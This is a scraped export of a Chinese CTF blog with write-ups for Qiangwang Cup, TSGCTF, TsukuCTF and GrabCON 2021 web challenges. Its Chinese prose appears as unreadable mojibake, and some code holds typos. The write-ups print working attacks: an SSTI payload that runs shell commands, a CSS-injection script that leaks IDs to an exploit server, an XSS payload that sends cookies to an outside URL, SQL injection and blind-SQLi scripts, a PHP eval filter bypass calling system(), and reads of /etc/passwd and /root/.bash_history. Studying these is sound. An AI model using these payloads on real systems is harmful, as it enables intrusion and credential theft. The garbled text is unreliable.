2021]æ¢¦é‡ŒèŠ±æ¥ç‰¡ä¸¹äº­ï¼‰ï¼Œä¸€ä¸ªæ˜¯flaskçš„sstiæ³¨å…¥ï¼Œä¸€å¼€å§‹ä¹Ÿæ˜¯0è§£ï¼Œä½†æ˜¯ä¸æ–­çš„æ”¾hintéƒ½æ²¡äººgetåˆ°ä»–çš„æ„æ€ï¼Œç›´åˆ°æœ€åæŠŠpayloadéƒ½ç»™æ”¾å‡ºæ¥äº†æ‰å¼€å§‹æœ‰è§£ï¼Œå¯èƒ½æ˜¯æƒ³çš„ç­¾åˆ°éš¾åº¦ï¼Œä½†æ˜¯å¤§å®¶æ²¡ç­¾ä¸ŠğŸ˜…\nï¼ˆpayloadæ˜¯{{lipsum['__globals__']['__builtins__']['eval']('__import__(\u0026quot;os\u0026quot;).popen(\u0026quot;ls /\u0026quot;).read()')}} ï¼‰\nç„¶åæ˜¯fixé˜¶æ®µï¼Œæˆ‘ä¿®äº†phpï¼Œå¦ä¸€ä½å¸ˆå‚…ä¿®äº†flaskï¼ŒpwnğŸ‘´ä¿®äº†ä¸€é“pwnï¼ˆå¦ä¸€ä¸ªæ²¡æœ‰è¿‡check\né˜²å¾¡é˜¶æ®µçš„åˆ†åŠ çš„ç‰¹åˆ«å¿«ï¼Œä¿®äº†ä¸¤ä¸ªé¢˜ç›´æ¥å°±å¹²åˆ°ç¬¬ä¸€äº†\nï¼ˆå¿½ç•¥æ—¶é—´ è¿™æ˜¯æ™šä¸Šå›æ¥ä¹‹åæˆªçš„å›¾\nåº”è¯¥æœ‰å¾ˆå¤šé˜Ÿä¸ä¼šç”¨dockerçš„ç›¸å…³æ“ä½œåƒäºäº†ï¼Œç¬¬ä¸€è½®fixåªæœ‰å¾ˆå°‘çš„é˜Ÿè¿‡äº†checkï¼Œåˆ°ç¬¬äºŒè½®fixçš„æ—¶å€™è¿˜ç»™äº†dockerå¤åˆ¶æ–‡ä»¶çš„å‘½ä»¤\nè¿™ä¸€åœºå’Œæ˜¨å¤©çš„é‚£åœºç»¼åˆä¸‹æ¥æˆ‘ä»¬æ˜¯8623åˆ†ï¼Œç¬¬äºŒåï¼Œæ‹¿ä¸€ç­‰å¥–~èŠœæ¹–\nç¬¬ä¸€åæ˜¯åŒ—å¤§çš„ä¸€ä¸ªå¤§ä½¬ï¼Œsoloå…¨åœºï¼Œttttttql\nå°ç»“ è¢«é˜Ÿé‡Œä¸¤ä¸ªå¸ˆå‚…å¸¦ç€ç¬¬ä¸€æ¬¡æ‰“çº¿ä¸‹ï¼Œæ„Ÿè§‰è¿˜æ˜¯æŒºæ£’çš„~~ï¼Œå…è´¹åƒä½ çˆ½çš„ä¸€æ‰¹~~ï¼Œæ„Ÿè§‰çº¿ä¸‹æœ‰ä¸€ç¾¤äººæ‰“ctfæ˜¯ä¸ªæŒºèµ›åšæœ‹å…‹çš„äº‹æƒ…å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆ\næ‰“ä¹‹å‰å…¶å®æ…Œçš„ä¸€æ‰¹ï¼Œæ¯•ç«Ÿè‡ªå·±webæ¯”è¾ƒèœï¼Œå®³æ€•æ‹‰è·¨ï¼Œå®³æ€•ç»™å¤§å®¶æ‹–åè…¿ï¼Œä¸è¿‡è¿˜å¥½æœ€åä¸€åˆ‡é¡ºåˆ©ï¼Œæ‹¿åˆ°äº†ä¸€ç­‰ï¼Œä¹‹å‰ä»ä¸æ•¢è®¾æƒ³çš„\né…¸èœæ£’æ£’é±¼yyds!!!!!!!!\nä»å¼€å§‹å­¦ctfï¼Œå­¦å®‰å…¨æ–¹é¢çš„çŸ¥è¯†åˆ°ç°åœ¨ä¹Ÿä¸è¿‡åŠå¹´å¤šä¸€ç‚¹ï¼Œå­¦çš„è¿˜æ˜¯ç›¸å½“ç²—ç³™çš„ï¼Œè§åˆ°çš„å¸ˆå‚…ä»¬éƒ½å­¦çš„æ—¶é—´æ¯”æˆ‘é•¿ï¼Œæ°´å¹³éƒ½æ¯”æˆ‘é«˜å¾ˆå¤šå¾ˆå¤š\næœªæ¥çš„è·¯è¿˜å¾ˆé•¿ï¼Œä¸ç®¡æ€ä¹ˆæ ·ï¼Œæˆ‘éƒ½ä¼šåšæŒèµ°ä¸‹å»çš„ã€‚\n","date":"2021-10-18T20:38:54+08:00","permalink":"https://amiaaaz.github.io/2021/10/18/2021-qwbqss-a-short-diary/","section":"posts","tags":[],"title":"2021å¼ºç½‘æ¯é’å°‘èµ›çº¿ä¸‹èµ›å‚èµ›è®°å½•"},{"categories":["CTF"],"contents":"https://score.ctf.tsg.ne.jp/challenges | https://ctftime.org/event/1431/tasks/\nWeb/Welcome to TSG CTF!  We want to welcome you, seriously.\n æŠ“åŒ…åå‘ç°æˆ‘ä»¬è¾“å…¥çš„å€¼æ˜¯postçš„jsonä¸­çš„keyéƒ¨åˆ†è€Œä¸æ˜¯valueï¼Œå¾ˆå¥‡æ€ª\nç»™äº†æºç ï¼Œçœ‹ä¸‹app.js\n11è¡Œæœ‰ä¸ªæ¯”è¾ƒï¼Œè¦é€šè¿‡å®ƒï¼Œå¯ä»¥æŠŠbodyç½®ç©ºè®¿é—®ï¼ˆç”¨burpçš„è¯è¦æ”¹ä¸€ä¸‹Content-Typeï¼Œé»˜è®¤çš„application/jsonæ˜¯ä¸èƒ½ç½®ç©ºçš„ï¼‰ï¼Œtypeof null === 'object'\n$ curl \u0026#34;http://34.84.69.72:34705/\u0026#34; -X POST {\u0026#34;statusCode\u0026#34;:500,\u0026#34;error\u0026#34;:\u0026#34;Internal Server Error\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Cannot read property \u0026#39;TSGCTF{M4king_We6_ch4l1en9e_i5_1ik3_playing_Jenga}\u0026#39; of null\u0026#34;} flagä¼šåœ¨æŠ¥é”™ä¸­å‡ºç°ï¼\nTSGCTF{M4king_We6_ch4l1en9e_i5_1ik3_playing_Jenga}\nWeb/Udon  Ta-dah! Here comes udon!\n Udon Noteï¼Œä¸€çœ¼xssä¹‹ç±»çš„\næˆ‘ä»¬å‘å‡ºå»çš„noteä¸­çš„å°–æ‹¬å·ä¼šè¢«è½¬ä¹‰ä¸ºå®ä½“å­—ç¬¦ï¼ŒResetä¼šæ¸…ç©ºcookieï¼Œè¿å¸¦ç€æ¶ˆå¤±ä¹‹å‰å‘å¸ƒè¿‡çš„Note\næœ‰Tell Admin About This Udon Noteçš„é€‰é¡¹\nâ€”â€”â€”â€”æ²¡ä»€ä¹ˆæƒ³æ³• ä»¥ä¸‹æ˜¯å¹³æ·¡çš„å¤ç°è¿‡ç¨‹\nçœ‹æºç ï¼Œmain.go\næˆ‘ä»¬éœ€è¦æ‰¾åˆ°é‚£ä¸ªç‰¹æ®Šçš„notes_id\næ¥ç€å¾€ä¸‹çœ‹\nhttpçš„ç›¸åº”å¤´å¯ä»¥æ³„éœ²ä¸€äº›ä¿¡æ¯ï¼Œè¿™é‡Œæ˜¯å…¥æ‰‹ç‚¹\nä»…åœ¨Firefoxä¸­æœ‰ä¸€ä¸ªLinkè¯·æ±‚å¤´ï¼Œå‡ ä¹ç­‰åŒäºHTMLä¸­çš„\u0026lt;link\u0026gt;æ ‡ç­¾\nLink: \u0026lt;/foo.css\u0026gt;; rel=\u0026quot;stylesheet\u0026quot;; type=\u0026quot;text/css\u0026quot; \u0026lt;link rel=\u0026quot;stylesheet\u0026quot; href=\u0026quot;/foo.css\u0026quot;\u0026gt; æˆ‘ä»¬å¯ä»¥å‘appä¸­çš„ä»»æ„ä¸€é¡µæ³¨å…¥ä»»æ„çš„css\nåŒæ—¶ä¹Ÿæœ‰éœ€è¦Bypassçš„åœ°æ–¹ï¼Œæ¯”å¦‚è¿™é‡Œçš„CSPç­–ç•¥style-src 'self'\næˆ‘ä»¬å¯ä»¥å…ˆåˆ›å»ºä¸€ä¸ªå¸¦æœ‰æ¶æ„cssçš„noteï¼Œå†å°†è¿™ä¸ªnoteçš„é“¾æ¥æ”¾å…¥Linkè¯·æ±‚å¤´ä¸­\nhttp://ip:port/?k=Link\u0026amp;v=%3C%2F(\u0026lt;URL of a note with styles to inject\u0026gt;)%3E%3B%20rel%3D%22stylesheet%22%3B%20type%3D%22text%2Fcss%22 # exp.py from flask import Flask, request import requests import urllib.parse import string TARGET_BASE = \u0026#34;http://localhost:8080\u0026#34; LEAK_LENGTH = 10 CHAR_CANDIDATES = string.ascii_letters + string.digits EXPLOIT_BASE_ADDR = \u0026#34;http://host.docker.internal:1337\u0026#34; app = Flask(__name__) s = requests.Session() def build_payload(prefix: str, candidates: \u0026#34;List[str]\u0026#34;): global EXPLOIT_BASE_ADDR assert EXPLOIT_BASE_ADDR != \u0026#34;\u0026#34;, \u0026#34;EXPLOIT_BASE_ADDR is not set\u0026#34; payload = \u0026#34;{}\u0026#34; for candidate in candidates: id_prefix_to_try = prefix + candidate matcher = \u0026#39;\u0026#39;.join(map(lambda x: \u0026#39;\\\\\u0026#39; + hex(ord(x)) [2:], \u0026#39;/notes/\u0026#39; + id_prefix_to_try)) payload += \u0026#34;a[href^=\u0026#34; + matcher + \\ \u0026#34;] { background-image: url(\u0026#34; + EXPLOIT_BASE_ADDR + \\ \u0026#34;/leak?q=\u0026#34; + urllib.parse.quote(id_prefix_to_try) + \u0026#34;); }\u0026#34; return payload def post_note(title: str, description: str) -\u0026gt; str: r = s.post(TARGET_BASE + \u0026#34;/notes\u0026#34;, data={ \u0026#34;title\u0026#34;: title, \u0026#34;description\u0026#34;: description, }, headers={ \u0026#34;content-type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34; }, allow_redirects=False) assert r.status_code == 302, \u0026#34;invalid status code: {}\u0026#34;.format( r.status_code) return r.headers[\u0026#39;Location\u0026#39;].split(\u0026#39;/notes/\u0026#39;)[-1] def report_note_as_stylesheet(id: str) -\u0026gt; None: header_value = \u0026#39;\u0026lt;/notes/{}\u0026gt;; rel=\u0026#34;stylesheet\u0026#34;; type=\u0026#34;text/css\u0026#34;\u0026#39;.format(id) r = s.post(TARGET_BASE + \u0026#34;/tell\u0026#34;, data={ \u0026#34;path\u0026#34;: \u0026#34;/?k=Link\u0026amp;v={}\u0026#34;.format(urllib.parse.quote(header_value)), }, allow_redirects=False) assert r.status_code == 302, \u0026#34;invalid status code: {}\u0026#34;.format( r.status_code) return None @app.route(\u0026#34;/start\u0026#34;) def start(): p = build_payload(\u0026#34;\u0026#34;, CHAR_CANDIDATES) exploit_id = post_note(\u0026#34;exploit\u0026#34;, p) report_note_as_stylesheet(exploit_id) print(\u0026#34;[info]: started exploit with a new note: {}/notes/{}\u0026#34;.format(TARGET_BASE, exploit_id)) return \u0026#34;\u0026#34; @app.route(\u0026#34;/leak\u0026#34;) def leak(): leaked_id = request.args.get(\u0026#39;q\u0026#39;) if len(leaked_id) == LEAK_LENGTH: print(\u0026#34;[+] leaked (full ID): {}\u0026#34;.format(leaked_id)) r = s.get(TARGET_BASE + \u0026#34;/notes/\u0026#34; + leaked_id) print(r.text) else: print(\u0026#34;[info] leaked: {}{}\u0026#34;.format( leaked_id, \u0026#34;*\u0026#34; * (LEAK_LENGTH - len(leaked_id)))) p = build_payload(leaked_id, CHAR_CANDIDATES) exploit_id = post_note(\u0026#34;exploit\u0026#34;, p) report_note_as_stylesheet(exploit_id) print(\u0026#34;[info]: invoked crawler with a new note: \u0026#34; + exploit_id) return \u0026#34;\u0026#34; if __name__ == \u0026#34;__main__\u0026#34;: print(\u0026#34;[info] running app ...\u0026#34;) app.run(host=\u0026#34;0.0.0.0\u0026#34;, port=1337) è¯¦ç»†å†…å®¹å‚è§-\u0026gt;wp\nWeb/Beginner\u0026rsquo;s Web 2021  Made drunk, so solved drunk.\n ç»™äº†æºç ï¼Œçœ‹ä¸‹index.jsï¼Œemmmmmmï¼Œåˆ›å»ºäº†session.routes\nä½†æ˜¯flagå¹¶ä¸ä¼šåœ¨æœ€åæ¸²æŸ“çš„routeä¸­å‡ºç°\næ‰€ä»¥æˆ‘ä»¬æƒ³åˆ©ç”¨GetSaltå¤„çš„session.salt='flag'æ¥è½¬åˆ°flagçš„è·¯ç”±ä¸Šæ¥è·å¾—flag\nä½†æ˜¯[salt]ä¼šå¯¼è‡´é‡å†™flagï¼Œæ‰€ä»¥æˆ‘ä»¬æƒ³è¦çš„sessionæ˜¯è¿™æ ·çš„çŠ¶æ€\nsession = { routes: { flag: ..., index: ..., ... [salt]: ..., // salt is anything different from \u0026#39;flag\u0026#39;  }, salt: \u0026#39;flag\u0026#39;, } é¦–å…ˆç”¨GET /?action=SetSalt\u0026amp;data=flagæ¥è®©salt='flag'ï¼Œsessionä¼šå˜æˆè¿™æ ·\nsession = { route: { flag: ...,\t// this route is overwritten and not accessible \tindex: ..., ... flag: ...,\t// here is salt \t}, salt: \u0026#39;flag\u0026#39;, } æˆ‘ä»¬æƒ³å›å¤åˆ°routeåªæœ‰ä¸€ä¸ªflagå¹¶ä¸”å¯è¾¾çš„çŠ¶æ€ï¼Œä½†æ˜¯åˆä¸æƒ³åˆ é™¤æ‰salt: 'flag'\nå…³é”®ä¹‹å¤„åœ¨äºset_saltï¼Œå®ƒæƒ³å®Œæˆçš„ä»»åŠ¡æ˜¯ä¸€èµ·æ›´æ–°routeså’Œsaltçš„å€¼\nset_salt: async (salt) =\u0026gt; { session.routes = await setRoutes(session, salt); session.salt = salt; return \u0026#39;ok\u0026#39;; } ç¬¬äºŒè¡Œä¸­ï¼Œæˆ‘ä»¬è¦await setRoutesï¼Œç›¸å½“äº\nset_salt: (salt) =\u0026gt; { return setRoutes(session, salt).then((result) =\u0026gt; { session.routes = result; session.salt = salt; return \u0026#39;ok\u0026#39;; }); } è¿™é‡Œä¼šè¦åˆ°ä¸€ä¸ªsetRoutesçš„è¿”å›å€¼result\nconst setRoutes = async (session, salt) =\u0026gt; { const index = await fs.readFile(\u0026#39;index.html\u0026#39;); session.routes = { // redacted \t[salt]: () =\u0026gt; salt, }; return session.routes; }; å¾ˆæ²¡å¿…è¦çš„æ“ä½œï¼Œåˆä¸€ésetRoutesï¼Œçº¯å±è„±è£¤å­æ”¾å±\nå½“æˆ‘ä»¬è®¾ç½®salt = 'then'æ—¶ï¼Œæƒ…å†µå°±ä¸ä¸€æ ·äº†\n{ //redacted \tthen: () =\u0026gt; salt, } è¿™ä¸ªç‰¹æ®Šçš„thenå…³é”®å­—ä¸€å‡ºæ¥ï¼Œå°±å¾ˆç‰¹æ®Šï¼Œè§£é‡Šå™¨ä¼šè¯•å›¾æŠŠå®ƒè®¤ä½œæ˜¯awaitä¸­è¦è°ƒç”¨çš„thençš„éƒ¨åˆ†ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰awaitéœ€è¦å®ƒè¿™ä¸ªthenæ‰§è¡Œçš„resultæ¥ä½œä¸ºè¿”å›å€¼ï¼Œå°±å¡æ­»åœ¨è¿™é‡Œäº†ï¼Œè¿™ä¸ªsaltæ— å¤„å¯å»\nSoï¼ŒGET /?action=SetSalt\u0026amp;data=thenä¹‹åsessionå°†æ˜¯è¿™æ ·çš„\nsession = { routes: { flag: ..., index: ..., ... then: ..., }, salt: \u0026#39;flag\u0026#39;, } åªè¦GET /?action=GetSaltå³å¯ï¼Œå› ä¸º\nreturn session.routes[route](data);\t// route = session.salt here (just flag) å…·ä½“æ“ä½œä¸€å¼ åŠ¨å›¾å°±èƒ½è¯´æ¸…æ¥š\næœ€åï¼Œè¿™ä¸ª**çš„ä¸œè¥¿å­¦åå«Thenable Objectï¼Œè°¢è°¢ä½ ï¼ŒjavascriptğŸ˜…\nå‚è€ƒï¼šwp\nWeb/Giita  Gibson Les Paul Standard.\nSteal Cookie.\n ğŸ˜­ğŸ˜­ğŸ˜­åˆæ˜¯cookie\nçœ‹æºç ï¼Œapp.js\n11è¡Œçš„æ­£åˆ™åŒ¹é…äº†ç©ºæ ¼ã€å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ï¼Œä½†æ˜¯å¤šä½™äº†ä¸€ä¸ª.\nä¼šæŠŠthemeæ”¾è¿›å»è¿›è¡Œä¸€ä¸ªè¿‡æ»¤\nç„¶åæ‹¼æ¥åˆ°stylesheet linkä¸­ï¼Œå°±å†æ²¡æœ‰ä»€ä¹ˆè¿‡æ»¤äº†\næˆ‘ä»¬å¯ä»¥æ³¨å…¥åˆ°hrefè¿™é‡Œï¼Œæ¯”å¦‚\n\u0026lt;!-- theme=x%20onerror%3Dalert --\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=x onerror=alert\u0026gt; è¦å®Œæ•´çš„æ³¨å…¥jsä»£ç ï¼Œæˆ‘ä»¬éœ€è¦cheat DOMPurify\nDOMPurifyä¼šå…ˆæ£€æµ‹å¯¹è±¡åœ¨ä¸åœ¨DOMPurify.isSupportedçš„èŒƒå›´å†…\næ‰€ä»¥å‘¢ï¼Œæˆ‘ä»¬æŠŠå®ƒç»™å…³å’¯\ndelete document.implementation.__proto__.createHTMLDocument æœ€åçš„Payloadï¼ŒU+00A0(NBSP)ä¸åœ¨htmlçš„ç©ºç™½ç¬¦ä¸­ï¼Œä½†æ˜¯åœ¨Javascriptçš„ç©ºç™½ç¬¦ä¸­\naxios({ method: \u0026#39;post\u0026#39;, url: `http://${host}:${port}/`, headers: { \u0026#39;content-type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39;, }, data: qs.encode({ theme: \u0026#39;x onerror=delete\\xA0document.implemenation__proto__.createHTMLDocument\u0026#39;, title: \u0026#39;x\u0026#39;, body: `\u0026lt;img src=\u0026#34;x\u0026#34; onerror=\u0026#34;location.href\u0026#34;=\u0026#39;${url}?\u0026#39; + document.cookie\u0026gt;`, }), }); å®Œæ•´å‚è§-\u0026gt;wp\n å°±æ˜¯èœ ä¸ä¼šåš å‹‰å¼ºçœ‹çœ‹wp è¿˜ä¸ä¸€å®šçœ‹å¾—æ‡‚\né“åºŸç‰©äº†ğŸ˜…\n","date":"2021-10-04T16:44:41+08:00","permalink":"https://amiaaaz.github.io/2021/10/04/tsgctf2021-wp/","section":"posts","tags":["wp"],"title":"TSGCTF2021 Wp"},{"categories":["CTF"],"contents":"è¿™ä¸¤å¤©åˆå¼€å§‹æœ‰ç‚¹æ‘†çƒ‚çš„è¿¹è±¡ï¼Œäºæ˜¯æŠŠå‘¨æœ«çš„ctfçœ‹çœ‹wpï¼Œæ°´ä¸€æ°´ï¼Œå¤ç°ä¸€ä¸‹\nå¦å¤–è¿™ä¸ªctfæœ€ç—›è‹¦çš„åœ°æ–¹åœ¨äºæ˜¯è‹±æ—¥å¤¹æ‚ï¼Œæˆ‘å¼€å§‹æ‡‚æ­ªæœä»åšä¸­æ–‡æ¯”èµ›é¡µé¢çš„æ—¶å€™æœ‰å¤šç—›è‹¦äº†\nWeb/logonly ç»™å‡ºçš„æ˜¯ä¸€ä¸ªæœ‰214155è¡Œçš„æ—¥å¿—æ–‡ä»¶ï¼Œåªæœ‰ç¬¬214154è¡Œè¿”å›200ok\næ˜¾ç„¶æ˜¯è¿›è¡Œäº†ä¸€ä¸ªå­—å…¸æ”»å‡»ï¼Œåœ¨ç¬¬214154æ¬¡å°è¯•æ—¶æ’å¯¹äº†ï¼Œæˆ‘ä»¬ä¸‹è½½ä¸€ä»½kalié‡Œçš„rockyou.txtä¸­çœ‹ä¸€ä¸‹214154æ˜¯ä¸ªå•¥ï¼ˆæœ‰æç¤ºç”¨åˆ°kaliè¿›è¡Œæ”»å‡»ï¼‰\nTsukuCTF{qwertyuiop[]\\\\}\nWeb/digits ä¸€ä¸ªfastapiç«™ï¼Œä½†æ˜¯è¦æ±‚ä¸æ˜¯å¾ˆé«˜çš„æ ·å­\nåŠ å·æ”¾åˆ°urlä¸­ç›¸å½“äºåŠè§’ç©ºæ ¼\nTsukuCTF{you_are_lucky_Tsukushi}\nWeb/login ç™»å½•æ¡†ï¼Œä¸‡èƒ½å¯†ç admin'or 1#\nTsukuCTF{You_4r3_SUP3R_H4CKER}\nä¸€èˆ¬è¿™ç§ç®€å•çš„ç™»å½•éƒ½æ˜¯ä¸‡èƒ½å¯†ç ï¼Œä½†æ˜¯ä¹Ÿå¾—å¤šè¯•ä¸€è¯•ï¼ŒåŠ ä¸ªæ³¨é‡Šç¬¦å•Š åˆ†å·ä»€ä¹ˆçš„\nWeb/login2 è¯´æ˜¯ä»£ç é‡æ„è¿‡äº†\nå†ç”¨ä¸Šé¢çš„ä¸‡èƒ½å¯†ç ç™»å…¥ä¼šæ˜¾ç¤ºè¿™ä¸ªç«™çš„æ‰€æœ‰è´¦å·\nè¯´æ˜è¿˜æ˜¯æœ‰sqliï¼Œå°è¯•ä¸€ä¸‹è”åˆæ³¨å…¥admin'or 1 union select null,null#ï¼Œè·Ÿä¸Šé¢æ˜¯ä¸€æ ·çš„å›æ˜¾ï¼Œè¯´æ˜æœ‰ä¸¤åˆ—ï¼Œç„¶åæ˜¯æ„‰å¿«çš„æ³¨å…¥ï¼ˆæ¯ä¸€æ¬¡çš„å›æ˜¾åœ¨é¡µé¢çš„æœ«å°¾ï¼Œæ³¨æ„è¿™ä¸ªæ˜¯æœ€åˆè¦æ‰¾åˆ°å¹¶ç¡®è®¤çš„ï¼‰\nadmin'or 1 union select table_name,null from information_schema.columns# admin'or 1 union select column_name,null from information_schema.columns where table_name='super_secret_table'# admin'or 1 union select secret,null from super_secret_table# TsukuCTF{50_muCh_GR3AT_Hacker_!ND3ED}\nWeb/login3 ä¾ç„¶æ˜¯å­˜åœ¨sqliï¼Œç”¨ä¸Šé¢çš„ä¸¤ä¸ªpayloadéƒ½èƒ½å›æ˜¾æ­£å¸¸ï¼Œä½†æ˜¯æ²¡æœ‰æ˜ç¡®çš„ä¿¡æ¯ï¼Œåº”è¯¥æ˜¯éœ€è¦ç›²æ³¨äº†\nimport requests def _execAnyQuery_core(query, pos, mid): url = \u0026#34;\u0026#34; params = { \u0026#34;name\u0026#34;: \u0026#34;\u0026#39;or ascii(substring(({0}),{1},1))\u0026gt;={2};#\u0026#34;.format(query, pos, mid), \u0026#34;password\u0026#34;: \u0026#34;a\u0026#34; } page = requests.post(url, data = params) return \u0026#34;ã‚ˆã†ã“ã\u0026#34; in page.text def _execAnyQuery(query, pos): low = 0 high = 256 while high - low \u0026gt; 1: mid = (high + low) // 2 if _execAnyQuery(query, pos, mid): low = mid else: high = mid return low def execAnyQuery(query): i = 1 while True: char = int(_execAnyQuery(query, i)) if char == 0: return print(chr(char), end=\u0026#34;\u0026#34;) i += 1 execAnyQuery(\u0026#34;select version()\u0026#34;) for i in range(100): execAnyQuery(\u0026#34;select distinct table_name from information_schema.columnns limit 1 offset {0}\u0026#34;.format(i)) print() for i in range(10): execAnyQuery(\u0026#34;select distinct column_name from information_shcema.columns where table_name=\u0026#39;urtla_secret_tsukushi\u0026#39;limit 1 offset {0}\u0026#34;.format(i)) print() for i in range(33): execAnyQuery(\u0026#34;select secret from urtla_secret_tsukushi_limit 1 offset {0}\u0026#34;.format(i)) è¿™æ˜¯å®˜æ–¹wpé‡Œçš„äºŒåˆ†æ³•è„šæœ¬ï¼ŒæŠŠç®€å•çš„äº‹æ‹†æˆäº†3ä¸ªå‡½æ•°ï¼Œå€’æ˜¯ä¹Ÿå¥½ï¼Œå¯å¤ç”¨æ€§max\nTsukuCTF{U_Are_Geni0us_T$UKUSH1}\nWeb/Journey æŠ“åŒ…çœ‹ï¼Œæœ‰å¾ˆå¤š307é‡å®šå‘ï¼Œè¿˜ä»¥ä¸ºæ˜¯è·Ÿä¹‹å‰é‚£ä¸ªä¸€æ ·è¦è·‘ä¸€ä¸‹ä¸€åƒå¤šæ¬¡çš„é‡å®šå‘ï¼Œä½†æ˜¯è¿™ä¸ªé‡å®šå‘æ˜¯æœ‰é™åº¦çš„ï¼Œæœ€åçš„ä½ç½®æ˜¯/problems/journey/goalï¼Œå›æ˜¾405é”™è¯¯\nçœ‹wpï¼Œå­¦åˆ°äº†\ncurl -H \u0026#39;Referer: https://tsukuctf.sechack365.com/problems/journey/railway/1\u0026#39; -X CONNECT https://tsukuctf.sechack365.com/problems/journey/goal åˆ©ç”¨çš„æ˜¯httpè¯·æ±‚ä¸­çš„connectæ–¹æ³•ï¼Œç›¸å…³å†…å®¹å¯å‚è§-\u0026gt;CONNECT(MDN) | HTTPä¹‹connect method\nWeb/gyOTAKU æ»¡è¶³17è¡Œè¦æ±‚çš„è¯ä¼šé€šè¿‡chromium browseræ¥è¿”å›ä¸€ä¸ªæˆªå›¾\næˆ‘ä»¬æ„é€ ä¸€ä¸ªå¦‚ä¸‹çš„htmlé¡µé¢\n\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt; è¿”å›500é”™è¯¯ï¼Œå†è¯•ä¸€ä¸‹\n\u0026lt;script\u0026gt;location.href=\u0026quot;/etc/passwd\u0026quot;\u0026lt;/script\u0026gt; æˆåŠŸè¿”å›\nç”¨ä¸€ä¸‹æˆ‘ä»¬çš„è€æœ‹å‹/root/.bash_history\n\u0026lt;script\u0026gt;location.href=\u0026quot;/root/.bash_history\u0026quot;\u0026lt;/script\u0026gt; å¯ä»¥è¯»ä¸€ä¸‹flagäº†\n\u0026lt;script\u0026gt;location.href=\u0026quot;/root/flagc464f9eba1.txt\u0026quot;\u0026lt;/script\u0026gt; TsukuCTF{Tsukushi_to_Sugina_no_chigai_ga_wakaran}\n æ°´ä¸€ç¯‡wpï¼Œæ°´æ°´æ›´å¥åº·\n","date":"2021-09-13T19:15:21+08:00","permalink":"https://amiaaaz.github.io/2021/09/13/tsuku2021-wp/","section":"posts","tags":["wp"],"title":"TsukuCTF2021 Wp"},{"categories":["CTF"],"contents":"Web/E4sy Pe4sy  Hack admin user!\nAuthor: r3curs1v3_pr0xy\n ä¸‡èƒ½å¯†ç  username=admin\u0026amp;password=%27%3D%27\nGrabCON{E4sy_pe4sy_SQL_1nj3ct10n}\nWeb/Door Lock  The door is open to all! See who is behind the admin door??\nAuthor: r3curs1v3_pr0xy\n å’Œä¸Šé¢é‚£ä¸ªä¸€æ ·çš„å‰ç«¯é¡µé¢ï¼Œä½†æ˜¯å¾ˆæ˜¾ç„¶ä¸‡èƒ½å¯†ç å¤±æ•ˆï¼Œéšä¾¿ç™»å…¥ä¸€ä¸ªå·ï¼Œæœ‰æ°´å¹³è¶Šæƒ\nç”¨burpè·‘ä¸€ä¸‹\nGrabCON{E4sy_1D0R_}\nWeb/Null Food Factory  Prove your hacking skill to get admin panel.\nAuthor: r3curs1v3_pr0xy\n è¿˜æ˜¯ä¸€æ¨¡ä¸€æ ·çš„å‰ç«¯ï¼Œç›®æ ‡è¿˜æ˜¯ä»¥adminç™»å…¥\nç”¨åˆ°çš„æ˜¯Null byte injectionï¼Œå…ˆä»¥admin%00ä¸ºç”¨æˆ·åæ³¨å†Œ\nç„¶åç”¨Adminçš„åå­—ç™»å…¥GrabCON{Null_byt3s_1s_L0v3}\nWeb/Basic Calc  Ever used calc based on php?\nAuthor: karma\n \u0026lt;?php if (isset($_POST[\u0026#34;eq\u0026#34;])){ $eq = $_POST[\u0026#34;eq\u0026#34;]; if(preg_match(\u0026#34;/[A-Za-z`]+/\u0026#34;,$eq)){ die(\u0026#34;BAD.\u0026#34;); } echo \u0026#34;Result: \u0026#34;; eval(\u0026#34;echo \u0026#34; . $eq . \u0026#34; ;\u0026#34;); }else{ echo highlight_file(\u0026#39;index.php\u0026#39;,true); } ?\u0026gt;ç°åœ¨çœ‹åˆ°phpçš„é¢˜æ„Ÿè§‰é‚£æ˜¯ç›¸å½“çš„äº²åˆ‡äº†â€¦â€¦\nè™½ç„¶æ˜¯ç›´æ¥æœ‰äº†evalï¼Œä½†æ˜¯è¿™ä¸ªæ­£åˆ™è¿‡æ»¤çš„æœ‰ç‚¹ç‹ ï¼Œå­—æ¯å…¨è¢«banæ‰ å°±åªèƒ½ç”¨xoræˆ–å…«è¿›åˆ¶çš„æ–¹å¼æ¥æŠŠå­—æ¯æå‡ºæ¥\nå…«è¿›åˆ¶ç‰ˆæœ¬ï¼š\n\u0026quot;\\163\\171\\163\\164\\145\\155\u0026quot;(\u0026quot;\\154\\163\u0026quot;) // \u0026quot;system\u0026quot;(\u0026quot;ls\u0026quot;) \u0026quot;\\163\\171\\163\\164\\145\\155\u0026quot;(\u0026quot;\\143\\141\\164\\40\\57\\146\\154\\141\\147\\147\\147\\147\\56\\164\\170\\164\u0026quot;) // \u0026quot;system(\u0026quot;cat /flagggg.txt\u0026quot;)\u0026quot; xor\nOuput: (\u0026quot;system\u0026quot;)(\u0026quot;cat /flagggg.txt\u0026quot;) = (('3'^'@').('9'^'@').('3'^'@').('4'^'@').('8'^']').('2'^'_'))(('8'^'[').('!'^'@').('4'^'@').('^'^'~').'/'.('8'^'^').('1'^']').('!'^'@').('8'^'_').('8'^'_').('8'^'_').('8'^'_').'.'.('4'^'@').('8'^'@').('4'^'@')) GrabCON{b4by_php_f0r_y0u}\nå‚è€ƒï¼š https://mystiz.hk/posts/2021-08-10-uiuctf-phpfuck/ | https://ctf.0xff.re/2021/uiuctf_2021/phpfuck | https://github.com/vichhika/CTF-Writeup/blob/main/GrabCON%20CTF%202021/Web/Basic%20Calc/README.md | https://discord.com/channels/740598439796015204/884036729902866463/884147222982324264\nOSINT/ProtonDate  Can you find the date, when was this email created?\nsc4ry_gh0st@protonmail[dot]com\nGrabCON{dd_mm_yyyy}\nAuthor: CETACEAN\n è¯´å®è¯ 